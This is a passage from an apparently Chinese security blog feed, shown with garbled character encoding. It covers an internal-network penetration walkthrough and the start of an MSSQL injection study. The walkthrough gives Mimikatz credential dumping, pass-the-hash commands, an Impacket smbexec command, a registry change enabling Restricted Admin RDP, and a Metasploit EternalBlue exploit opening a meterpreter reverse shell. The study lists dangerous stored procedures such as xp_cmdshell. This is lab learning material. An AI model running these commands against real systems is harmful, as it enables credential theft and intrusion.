æ­¤å½“è·å¾—æœ‰æ•ˆçš„ç”¨æˆ·åå’Œå“ˆå¸Œä¹‹åï¼Œå°±èƒ½å¤Ÿåˆ©ç”¨è¯¥ä¿¡æ¯å¯¹è¿œç¨‹ä¸»æœºè¿›è¡Œèº«ä»½éªŒè¯ã€‚</p><h2 id="å“ˆå¸Œä¼ é€’æ”»å‡»çš„åˆ©ç”¨"><a href="#å“ˆå¸Œä¼ é€’æ”»å‡»çš„åˆ©ç”¨" class="headerlink" title="å“ˆå¸Œä¼ é€’æ”»å‡»çš„åˆ©ç”¨"></a>å“ˆå¸Œä¼ é€’æ”»å‡»çš„åˆ©ç”¨</h2><p>ä¸‹é¢ç”¨Mimikatzå’ŒImpacketè¿›è¡Œå“ˆå¸Œä¼ é€’å·¥å…·ï¼Œç›¸å…³å·¥å…·è¿˜æœ‰å¾ˆå¤šï¼Œå¦‚CrackMapExecã€PowerShellã€Evil-Winrmç­‰ï¼ŒMetasploitæ¡†æ¶ä¸‹ä¹Ÿå†…ç½®äº†å¾ˆå¤šå¯ä»¥æ‰§è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»çš„æ¨¡å—ã€‚</p><p><strong>Mimikatzåˆ©ç”¨</strong></p><p>MImikatzå†…ç½®äº†å“ˆå¸Œä¼ é€’åŠŸèƒ½ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><ol><li><p>Mimikatzä¸Šä¼ åˆ°è·³æ¿æœºåæ‰§è¡Œä¸‹é¢å‘½ä»¤æŠ“å–åŸŸç®¡ç†å‘˜å“ˆå¸Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448999.png" alt="image-20240416094725309"></p></li><li><p>åˆ©ç”¨æŠ“å–åˆ°çš„NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/userï¼ŒæŒ‡å®šè¦ä¼ é€’çš„ç”¨æˆ·å;/domainï¼ŒæŒ‡å®šå½“å‰æ‰€å¤„åŸŸåæˆ–å·¥ä½œç»„å;/ntlmï¼ŒæŒ‡å®šç”¨æˆ·å“ˆå¸Œ</span><br></code></pre></td></tr></table></figure><p>å¼¹å‡ºä¸€ä¸ªæ–°çš„å‘½ä»¤è¡Œçª—å£ï¼Œåœ¨æ–°çš„å‘½ä»¤è¡Œä¸­å…·æœ‰åŸŸç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥è®¿é—®åŸŸæ§çš„CIFSæœåŠ¡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448000.png" alt="image-20240416094714274"></p></li></ol><p><strong>åˆ©ç”¨Impacketè¿›è¡ŒPTH</strong></p><p>è¯¥é¡¹ç›®ä¸­å…·æœ‰è¿œç¨‹æ‰§è¡ŒåŠŸèƒ½çš„å‡ ä¸ªè„šæœ¬å‡ ä¹éƒ½å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œå¸¸è§çš„æœ‰psexec.pyã€smbexec.pyå’Œwmiexec.pyã€‚ä½¿ç”¨æ—¶å¯ä»¥é…åˆå†…ç½‘ä»£ç†æŠ€æœ¯è¿›è¡Œæ”»å‡»ã€‚</p><p>ä¾‹å¦‚smbexec.pyï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/administrator@10.10.10.19<br><span class="hljs-meta prompt_"># </span><span class="language-bash">python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-hashesï¼ŒæŒ‡å®šç”¨æˆ·å®Œæ•´çš„å“ˆå¸Œå€¼ï¼Œå¦‚æœ LM Hashè¢«åºŸå¼ƒï¼Œå°±å°†å…¶æŒ‡å®šä¸º0æˆ–ä¸ºç©º</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨å“ˆå¸Œä¼ é€’ç™»å½•è¿œç¨‹æ¡Œé¢"><a href="#åˆ©ç”¨å“ˆå¸Œä¼ é€’ç™»å½•è¿œç¨‹æ¡Œé¢" class="headerlink" title="åˆ©ç”¨å“ˆå¸Œä¼ é€’ç™»å½•è¿œç¨‹æ¡Œé¢"></a>åˆ©ç”¨å“ˆå¸Œä¼ é€’ç™»å½•è¿œç¨‹æ¡Œé¢</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>è¿œç¨‹ä¸»æœºå¼€å¯äº†â€å—é™ç®¡ç†å‘˜æ¨¡å¼â€</li><li>ç”¨äºè¿œç¨‹ç™»é™†çš„ç”¨æˆ·ä½äºè¿œç¨‹ä¸»æœºçš„ç®¡ç†å‘˜ç»„ä¸­</li><li>ç›®æ ‡ç”¨æˆ·çš„å“ˆå¸Œ</li></ol><p>Windows Server 2012 R2åŠä»¥ä¸Šç‰ˆæœ¬çš„ Windows ç³»ç»Ÿé‡‡ç”¨äº†æ–°ç‰ˆçš„RDPï¼Œæ”¯æŒå—é™ç®¡ç†å‘˜æ¨¡å¼(Restricted Admin Mode)ã€‚å¼€å¯è¯¥æ¨¡å¼åï¼Œæµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡å“ˆå¸Œä¼ é€’ç›´æ¥ç™»å½•è¿œç¨‹æ¡Œé¢ï¼Œä¸éœ€è¾“å…¥æ˜æ–‡å¯†ç ã€‚å—é™ç®¡ç†å‘˜æ¨¡å¼åœ¨ Windows 8.1å’Œ Windows Server2012R2ä¸Šé»˜è®¤å¼€å¯ï¼Œåœ¨å…¶ä»–ä¸»æœºä¸­å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ‰‹åŠ¨å¼€å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\System\CurrentControlset\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure><ol><li><p>æŸ¥çœ‹ä¸»æœºæ˜¯å¦å¼€å¯â€å—é™ç®¡ç†å‘˜æ¨¡å¼â€ï¼Œä¸º0åˆ™å¼€å¯ï¼Œå¦åˆ™æœªå¼€å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query &quot;HKLM\System\CurrentControlset\Control\Lsa&quot; /v DisableRestrictedAdmin<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448001.png" alt="image-20240416180945907"></p></li><li><p>è‹¥å¼€å¯ï¼Œåˆ™é€šè¿‡Mimikatzè¿›è¡Œåˆ©ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">privilege::debug<br>sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab &quot;/run:mstsc.exe /restrictedadmin&quot;<br></code></pre></td></tr></table></figure><p>å¤§è‡´åŸç†æ˜¯ï¼Œå“ˆå¸Œä¼ é€’æˆåŠŸåæ‰§è¡Œâ€œmstsc.exe &#x2F;restrictedadminâ€å‘½ä»¤ï¼Œä»¥å—é™ç®¡ç†å‘˜æ¨¡å¼è¿è¡Œè¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä¸éœ€è¾“å…¥ç”¨æˆ·åå¯†ç å³å¯æˆåŠŸç™»å½•è¿œç¨‹æ¡Œé¢</p></li></ol><h1 id="eternalblue"><a href="#EternalBlue" class="headerlink" title="EternalBlue"></a>EternalBlue</h1><p>å³å¤§åé¼é¼çš„æ°¸æ’ä¹‹è“æ¼æ´ã€‚</p><p>Metasploit æ¸—é€æ¡†æ¶å†…ç½®äº† EternalBlue æ¼æ´çš„æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ã€‚ä¸‹é¢é€šè¿‡ Windowsâ€™ç¯å¢ƒè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚</p><ol><li><p>é€šè¿‡auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010æ¨¡å—æ‰«æç›®æ ‡ä¸»æœºæ˜¯å¦å­˜åœ¨æ¼æ´</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/smb/smb_ms17_010<br>set rhosts 10.10.10.14  # è®¾ç½®ç›®æ ‡ä¸»æœºçš„IPï¼Œä¹Ÿå¯ä»¥è®¾ç½®æ•´ä¸ªIPæ®µ<br>set threads 10<br>exploit<br></code></pre></td></tr></table></figure></li><li><p>é€šè¿‡exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueæ¨¡å—è¿›è¡Œæ¼æ´åˆ©ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/windows/smb/ms17_010_eternalblue<br>set rhosts 10.10.10.14<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 10.10.10.147<br>set lport 4444<br>exploit<br></code></pre></td></tr></table></figure></li></ol><p>Metasploitä¸­è¿˜æœ‰å¾ˆå¤šè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç›¸å…³çš„æ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQLå­¦ä¹ </title>
      <link href="/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ¥å­¦ä¹ ä¸€ä¸‹MSSQLç›¸å…³çš„å®‰å…¨çŸ¥è¯†ï¼Œä¸èƒ½åªå­¦MySQL</p><p>è¿™é‡Œæ‰¾åˆ°ä¸€ä½å¤§ä½¬çš„æ–‡ç« ï¼Œè·Ÿç€è¿™ä¸ªæ¥é€æ­¥å­¦ä¹ ï¼š<a href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a></p><h1 id="mssqlä»‹ç»"><a href="#MSSQLä»‹ç»" class="headerlink" title="MSSQLä»‹ç»"></a>MSSQLä»‹ç»</h1><p><strong>ç®€ä»‹</strong></p><p>MSSQLä¹Ÿå«Microsoft SQL Serverã€‚</p><p>SQL Serveræ˜¯ç”±Microsoftå¼€å‘å’Œæ¨å¹¿çš„**å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ(DBMS)**ï¼›</p><p>SQL Serverä½¿ç”¨æ–¹ä¾¿ï¼Œä¼¸ç¼©æ€§å¥½ä¸ç›¸å…³è½¯ä»¶é›†æˆç¨‹åº¦é«˜ï¼›</p><p>SQL Server æ•°æ®åº“å¼•æ“ä¸ºå…³ç³»å‹æ•°æ®å’Œç»“æ„åŒ–æ•°æ®æä¾›äº†æ›´å®‰å…¨å¯é çš„å­˜å‚¨åŠŸèƒ½ã€‚</p><p><strong>SQL Serverå„æœåŠ¡ä½œç”¨</strong></p><ul><li>SQL Server(MSSQLSERVER)æ˜¯å¿…é¡»è¦å¼€å¯çš„ï¼Œè¿™ä¸ªæ˜¯æ•°æ®åº“å¼•æ“æœåŠ¡ï¼Œå®ƒå°±åƒæ±½è½¦çš„å‘åŠ¨æœºä¸€æ ·ï¼Œç¼ºå®ƒä¸å¯ã€‚</li><li>SQL Serverä»£ç†(MSSQLSERVER)æ˜¯ä»£ç†æœåŠ¡ï¼Œæ¯”å¦‚ä½ æœ‰ä¸€äº›è‡ªåŠ¨è¿è¡Œçš„ï¼Œå®šæ—¶ä½œä¸šï¼Œæˆ–è€…æ˜¯ä¸€äº›ç»´æŠ¤è®¡åˆ’ï¼Œæ¯”å¦‚å®šæ—¶å¤‡ä»½æ•°æ®åº“ç­‰æ“ä½œï¼Œé‚£ä¹ˆå°±è¦æ‰“å¼€ï¼Œå¦åˆ™ï¼Œå°±ä¸ä¼šå¤‡ä»½æ•°æ®åº“äº†ã€‚ </li><li>SQL Server Analysis Services (MSSQLSERVER)æ˜¯åˆ†ææœåŠ¡ï¼Œä¸€èˆ¬ä¸ç”¨å¼€å¯ï¼Œé™¤éä½ åšå¤šä½åˆ†æï¼Œå’Œæ•°æ®æŒ–æ˜ï¼Œæ‰éœ€è¦å¼€å¯ã€‚</li><li>SQL Full-text Filter Daemon Launcher (MSSQLSERVER)æ˜¯å…¨æ–‡æ£€ç´¢æœåŠ¡ï¼Œå¦‚æœä½ æ²¡æœ‰ä½¿ç”¨å…¨æ–‡æ£€ç´¢æŠ€æœ¯ï¼Œé‚£ä¹ˆä¹Ÿä¸éœ€è¦å¼€å¯ã€‚ </li><li>SQL Server VSS Writer MicrosoftSQLServerçš„SQLç¼–å†™å™¨æœåŠ¡ï¼Œå…è®¸å¤‡ä»½å’Œè¿˜åŸåº”ç”¨ç¨‹åºä»¥ä¾¿åœ¨VolumeShadowCopyService(VSS)æ¡†æ¶ä¸­è¿›è¡Œæ“ä½œã€‚</li><li>Sql Browser æœåŠ¡ ä¸€èˆ¬ä½ è¦è¿›è¡Œè¿œç¨‹è®¿é—®ï¼Œä¸éœ€è¦å¼€å¯sql browserï¼Œé€šè¿‡ï¼šæœåŠ¡å™¨ip,ç«¯å£ è¿™ç§æ–¹å¼å°±å¯ä»¥è®¿é—®è¿œç¨‹çš„æœåŠ¡å™¨ã€‚</li></ul><p>ä¸‹é¢å®‰è£…MSSQL2008çš„ç‰ˆæœ¬ç”¨æ¥å­¦ä¹ ã€‚</p><h1 id="mssqlåŸºç¡€çŸ¥è¯†"><a href="#MSSQLåŸºç¡€çŸ¥è¯†" class="headerlink" title="MSSQLåŸºç¡€çŸ¥è¯†"></a>MSSQLåŸºç¡€çŸ¥è¯†</h1><h2 id="ä¸€äº›é»˜è®¤åº“"><a href="#ä¸€äº›é»˜è®¤åº“" class="headerlink" title="ä¸€äº›é»˜è®¤åº“"></a>ä¸€äº›é»˜è®¤åº“</h2><ul><li>master   &#x2F;&#x2F;ç”¨äºè®°å½•æ‰€æœ‰SQL Serverç³»ç»Ÿçº§åˆ«çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ç”¨äºæ§åˆ¶ç”¨æˆ·æ•°æ®åº“å’Œæ•°æ®æ“ä½œã€‚</li><li>model    &#x2F;&#x2F;SQL Serverä¸ºç”¨æˆ·æ•°æ®åº“æä¾›çš„æ ·æ¿ï¼Œæ–°çš„ç”¨æˆ·æ•°æ®åº“éƒ½ä»¥modelæ•°æ®åº“ä¸ºåŸºç¡€</li><li>msdb     &#x2F;&#x2F;ç”± Enterprise Managerå’ŒAgentä½¿ç”¨ï¼Œè®°å½•ç€ä»»åŠ¡è®¡åˆ’ä¿¡æ¯ã€äº‹ä»¶å¤„ç†ä¿¡æ¯ã€æ•°æ®å¤‡ä»½åŠæ¢å¤ä¿¡æ¯ã€è­¦å‘ŠåŠå¼‚å¸¸ä¿¡æ¯</li><li>tempdb   &#x2F;&#x2F;å®ƒä¸ºä¸´æ—¶è¡¨å’Œå…¶ä»–ä¸´æ—¶å·¥ä½œæä¾›äº†ä¸€ä¸ªå­˜å‚¨åŒºã€‚</li></ul><blockquote><p>sqlserverä½¿ç”¨çš„ä¸¤ä¸ªç«¯å£ï¼ŒTCP-1433ï¼ŒUDP-1434</p><p>mssqlæ³¨å…¥å¸¸è¦æ‰“äº¤é“çš„åº“ä¹Ÿå°±æ˜¯ masterï¼Œå…¶ä¸­å‚¨å­˜äº†æ‰€æœ‰æ•°æ®åº“åä¸å­˜å‚¨è¿‡ç¨‹ã€‚ç±»æ¯”äº MySQL ä¸­çš„ <code>information_schema</code> å…ƒæ•°æ®åº“</p><p>æƒé™:2008ä¹‹å‰ï¼Œä¸ºsystemã€2008åŠå…¶ä»¥åæƒé™ä¸å†ä¸ºsystem</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151441327.png" alt="image-20240404103930739"></p><p>ä¸‹é¢å‘½ä»¤å¯ä»¥æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select name from master.dbo.sysdatabases;<br>select name from master.sys.databases;<br>//sqlserver2005ä¹‹åsysdatabaseså˜æˆsys.databaseså­˜æ”¾åœ¨è§†å›¾ä¸­<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441328.png" alt="image-20240404104149872"></p><p><img src="http://cdn.clown2024.cn/202407151441329.png" alt="image-20240404104216061"></p><p>ä¸‹åˆ—å‘½ä»¤ç”¨æ¥æŸ¥è¯¢å¯¹è±¡ååŠå…¶ç±»å‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select top 100 name,xtype from sysobjects;//ä»å½“å‰æ•°æ®åº“çš„ sysobjects ç³»ç»Ÿè¡¨ä¸­é€‰æ‹©å‰ 100 è¡Œçš„ name å’Œ xtype åˆ—æ•°æ®<br>//ä½†æ˜¯åœ¨sys.objectsä¸­xtypeä¸ºtype<br>select top 100 name,type from sys.objects;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441330.png" alt="image-20240404105226387"></p><p><img src="http://cdn.clown2024.cn/202407151441331.png" alt="image-20240404105705167"></p><p>ä¸‹é¢æ˜¯ä¸€äº›åœ¨ SQL Server ä¸­ç”¨äºæè¿°å¯¹è±¡ç±»å‹çš„ç¼©å†™æˆ–æ ‡è¯†ç¬¦ã€‚å®ƒä»¬é€šå¸¸åœ¨ç³»ç»Ÿè¡¨ä¸­ä½¿ç”¨ï¼Œä»¥åŒºåˆ†ä¸åŒç§ç±»çš„æ•°æ®åº“å¯¹è±¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C = CHECK çº¦æŸï¼šè¡¨ç¤ºä¸€ä¸ªè¡¨çš„æ£€æŸ¥çº¦æŸï¼Œç”¨äºç¡®ä¿æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„æ•°æ®æ‰èƒ½æ’å…¥åˆ°è¡¨ä¸­ã€‚<br>D = é»˜è®¤å€¼æˆ– DEFAULT çº¦æŸï¼šè¡¨ç¤ºå¯¹åˆ—çš„é»˜è®¤å€¼çº¦æŸï¼Œç”¨äºåœ¨æ’å…¥æ–°è¡Œæ—¶ä¸ºåˆ—æä¾›é»˜è®¤å€¼ã€‚<br>F = FOREIGN KEY çº¦æŸï¼šè¡¨ç¤ºå¤–é”®çº¦æŸï¼Œç”¨äºç»´æŠ¤è¡¨ä¸è¡¨ä¹‹é—´çš„å¼•ç”¨å®Œæ•´æ€§ã€‚<br>L = æ—¥å¿—ï¼šè¡¨ç¤ºæ•°æ®åº“çš„äº‹åŠ¡æ—¥å¿—ï¼Œç”¨äºè®°å½•æ•°æ®åº“çš„æ›´æ–°æ“ä½œï¼Œä»¥ç¡®ä¿äº‹åŠ¡çš„æŒä¹…æ€§å’Œä¸€è‡´æ€§ã€‚<br>FN = æ ‡é‡å‡½æ•°ï¼šè¡¨ç¤ºæ ‡é‡å‡½æ•°ï¼Œå®ƒè¿”å›å•ä¸ªå€¼ã€‚<br>IF = å†…åµŒè¡¨å‡½æ•°ï¼šè¡¨ç¤ºå†…è”è¡¨å€¼å‡½æ•°ï¼Œå®ƒèƒ½è¿”å›ä¸€ä¸ªåŒ…å«å¤šè¡Œçš„ç»“æœé›†ã€‚<br>P = å­˜å‚¨è¿‡ç¨‹ï¼šè¡¨ç¤ºæ•°æ®åº“ä¸­çš„å­˜å‚¨è¿‡ç¨‹ï¼ŒåŒ…å«äº†å¯å¤ç”¨çš„ã€é¢„ç¼–è¯‘çš„ SQL ä»£ç å—ã€‚<br>PK = PRIMARY KEY çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ï¼šè¡¨ç¤ºä¸»é”®çº¦æŸï¼Œç”¨äºå”¯ä¸€æ ‡è¯†è¡¨ä¸­çš„æ¯ä¸€è¡Œè®°å½•ã€‚<br>RF = å¤åˆ¶ç­›é€‰å­˜å‚¨è¿‡ç¨‹ï¼šè¿™æ˜¯ä¸ SQL Server å¤åˆ¶åŠŸèƒ½ç›¸å…³çš„å¯¹è±¡ï¼Œç”¨äºç­›é€‰è¦å¤åˆ¶çš„æ•°æ®ã€‚<br>S = ç³»ç»Ÿè¡¨ï¼šè¡¨ç¤ºæ•°æ®åº“ç³»ç»Ÿè¡¨ï¼Œç”¨äºå­˜å‚¨æ•°æ®åº“å…ƒæ•°æ®ä¿¡æ¯çš„ç‰¹æ®Šè¡¨ã€‚<br>TF = è¡¨å‡½æ•°ï¼šè¡¨ç¤ºè¡¨å€¼å‡½æ•°ï¼Œå®ƒå¯ä»¥è¿”å›ä¸€ä¸ªè¡¨ç¤ºä¸ºè¡¨æ ¼çš„ç»“æœé›†ã€‚<br>TR = è§¦å‘å™¨ï¼šè¡¨ç¤ºæ•°æ®åº“ä¸­çš„è§¦å‘å™¨ï¼Œç”¨äºå®šä¹‰åœ¨è¡¨ä¸Šæ‰§è¡Œçš„è‡ªåŠ¨åŒ–æ“ä½œã€‚<br>U = ç”¨æˆ·è¡¨ï¼šè¡¨ç¤ºç”¨æˆ·åˆ›å»ºçš„è¡¨ï¼Œç”¨äºå­˜å‚¨å®é™…æ•°æ®ã€‚<br>UQ = UNIQUE çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ï¼šè¡¨ç¤ºå”¯ä¸€çº¦æŸï¼Œç”¨äºç¡®ä¿åˆ—æˆ–åˆ—ç»„åˆä¸­çš„å€¼æ˜¯å”¯ä¸€çš„ã€‚<br>V = è§†å›¾ï¼šè¡¨ç¤ºæ•°æ®åº“ä¸­çš„è§†å›¾ï¼Œæä¾›äº†å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªåŸºæœ¬è¡¨çš„ç»“æ„åŒ–è®¿é—®ã€‚<br>X = æ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼šè¡¨ç¤ºæ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼Œè¿™æ˜¯ä¸€ç§ç‰¹æ®Šçš„å­˜å‚¨è¿‡ç¨‹ç±»å‹ã€‚<br></code></pre></td></tr></table></figure><p><strong>å­˜å‚¨è¿‡ç¨‹</strong></p><blockquote><p>å‚¨å­˜è¿‡ç¨‹æ˜¯ä¸€ä¸ªå¯ç¼–ç¨‹çš„å‡½æ•°ï¼Œå®ƒåœ¨æ•°æ®åº“ä¸­åˆ›å»ºå¹¶ä¿å­˜ã€‚å®ƒå¯ä»¥æœ‰SQLè¯­å¥å’Œä¸€äº›ç‰¹æ®Šçš„æ§åˆ¶ç»“æ„ç»„æˆã€‚å½“å¸Œæœ›åœ¨ä¸åŒçš„åº”ç”¨ç¨‹åºæˆ–å¹³å°ä¸Šæ‰§è¡Œç›¸åŒçš„å‡½æ•°ï¼Œæˆ–è€…å°è£…ç‰¹å®šåŠŸèƒ½æ—¶ï¼Œå­˜å‚¨è¿‡ç¨‹æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚æ•°æ®åº“ä¸­çš„å­˜å‚¨è¿‡ç¨‹å¯ä»¥çœ‹åšæ˜¯å¯¹ç¼–ç¨‹ä¸­é¢å‘å¯¹è±¡æ–¹æ³•çš„æ¨¡æ‹Ÿã€‚å®ƒå…è®¸æ§åˆ¶æ•°æ®çš„è®¿é—®æ–¹å¼ã€‚</p><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹</p></blockquote><p><strong>å¸¸ç”¨çš„å±é™©å­˜å‚¨è¿‡ç¨‹åŠå…¶ä½œç”¨</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xp_cmdshellï¼šæ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„å­˜å‚¨è¿‡ç¨‹ï¼Œå¯ç”¨äºåœ¨ SQL Server ä¸Šè¿è¡Œå‘½ä»¤è¡Œå‘½ä»¤ã€‚<br><br>xp_dirtreeï¼šåœ¨æŒ‡å®šç›®å½•ä¸‹åˆ—å‡ºæ‰€æœ‰ç›®å½•åŠå­ç›®å½•çš„æ–‡ä»¶å¤¹ç»“æ„ã€‚<br><br>xp_enumgroupsï¼šç”¨äºåˆ—ä¸¾ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç”¨æˆ·ç»„ã€‚<br><br>xp_fixeddrivesï¼šè¿”å›è®¡ç®—æœºä¸Šæ‰€æœ‰ç£ç›˜é©±åŠ¨å™¨çš„ä¿¡æ¯ã€‚<br><br>xp_loginconfigï¼šæ˜¾ç¤ºæœ‰å…³ SQL Server ç™»å½•çš„é…ç½®ä¿¡æ¯ã€‚<br><br>xp_enumerrorlogsï¼šåˆ—å‡ºç³»ç»Ÿé”™è¯¯æ—¥å¿—çš„å†…å®¹ã€‚<br><br>xp_getfiledetailsï¼šè¿”å›æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚è·¯å¾„ã€å¤§å°ã€åˆ›å»ºæ—¥æœŸç­‰ã€‚<br><br>Sp_OACreateï¼šç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„OLE Automation å¯¹è±¡ã€‚<br><br>Sp_OADestroyï¼šé‡Šæ”¾å…ˆå‰åˆ›å»ºçš„OLE Automation å¯¹è±¡ã€‚<br><br>Sp_OAGetErrorInfoï¼šè·å–å…³äºä¸Šä¸€æ¬¡è°ƒç”¨çš„é”™è¯¯ä¿¡æ¯ã€‚<br><br>Sp_OAGetPropertyï¼šè·å–ä¸€ä¸ªOLE Automation å¯¹è±¡çš„å±æ€§å€¼ã€‚<br><br>Sp_OAMethodï¼šè°ƒç”¨ä¸€ä¸ªOLE Automation å¯¹è±¡çš„æ–¹æ³•ã€‚<br><br>Sp_OASetPropertyï¼šè®¾ç½®ä¸€ä¸ªOLE Automation å¯¹è±¡çš„å±æ€§å€¼ã€‚<br><br>Sp_OAStopï¼šåœæ­¢OLE Automation å¯¹è±¡çš„æ‰§è¡Œã€‚<br><br>Xp_regaddmultistringï¼šå‘æ³¨å†Œè¡¨ä¸­æŒ‡å®šé¡¹æ·»åŠ åç§°å’Œæ•°æ®ã€‚<br><br>Xp_regdeletekeyï¼šåˆ é™¤æŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹åŠå…¶æ‰€æœ‰å­é¡¹ã€‚<br><br>Xp_regdeletevalueï¼šåˆ é™¤æŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹ä¸­çš„æŒ‡å®šå€¼ã€‚<br><br>Xp_regenumvaluesï¼šè¿”å›æŒ‡å®šæ³¨å†Œè¡¨é¡¹çš„å€¼åç§°åˆ—è¡¨ã€‚<br><br>Xp_regreadï¼šè¿”å›æŒ‡å®šæ³¨å†Œè¡¨é¡¹çš„æŒ‡å®šå€¼çš„æ•°æ®ã€‚<br><br>Xp_regremovemultistringï¼šä»æ³¨å†Œè¡¨ä¸­æŒ‡å®šçš„é¡¹ä¸­ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå¤šå­—ç¬¦ä¸²å€¼ã€‚<br><br>Xp_regwriteï¼šå°†æ•°æ®å†™å…¥æŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹ã€‚<br><br>sp_makewebtaskï¼šç”Ÿæˆç”¨äºåœ¨ SQL Server ä¸Šå¯¼å‡ºæ•°æ®çš„å‘½ä»¤ã€‚<br><br>sp_configure:  ç”¨äºæŸ¥çœ‹å’Œæ›´æ”¹æœåŠ¡å™¨é…ç½®é€‰é¡¹<br></code></pre></td></tr></table></figure><h2 id="ä¸€äº›å­—ç¬¦"><a href="#ä¸€äº›å­—ç¬¦" class="headerlink" title="ä¸€äº›å­—ç¬¦"></a>ä¸€äº›å­—ç¬¦</h2><p><strong>æ³¨é‡Šç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/**/<br>--<br>;%00 //emmè¿™ä¸ªæˆ‘è¯•ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯åœ¨ç½‘é¡µå¾—æ—¶å€™æ‰æœ‰ç”¨ï¼Œå› ä¸º%00å‡ºæ¥æ˜¯NULL<br></code></pre></td></tr></table></figure><p><strong>ç©ºç™½ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441332.png" alt="image-20240404111658741"></p><p><strong>ç‰¹æ®Šä¸€ç‚¹çš„è¿ç®—ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ALL å¦‚æœä¸€ç»„çš„æ¯”è¾ƒéƒ½ä¸ºtrueï¼Œåˆ™æ¯”è¾ƒç»“æœä¸ºtrue<br><br>AND 